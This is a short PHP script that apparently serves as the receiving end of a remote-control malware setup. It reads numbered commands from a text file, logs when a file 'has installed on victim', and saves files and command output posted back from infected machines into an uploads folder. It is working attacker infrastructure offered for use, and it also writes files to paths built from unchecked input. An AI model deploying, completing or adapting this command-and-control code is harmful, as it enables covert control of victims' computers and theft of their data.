<?php
$target_dir = "uploads/";



if(isset($_GET['number'])) {
  $myFile = "commands.txt";
  $lines = file($myFile);//file in to an array

  $command = strtok($lines[$_GET['number']], " ");// the command 
  $content = "";
  $file_name = "";
  if($command == "putfile"){ 
    $content = "file has installed on victim";
    $file_name = $_GET['number'].".txt";
  }
  elseif($command == "getfile"){
    $content = file_get_contents('php://input');
    $file_name = strrchr($lines[$_GET['number']],' ');
  }
  else{
    $content = file_get_contents("php://input");
    $file_name = $_GET['number'].".txt";
  }

  $fp = fopen($target_dir.$file_name, 'w');
  fwrite($fp, $content);
  fclose($fp);
}

?>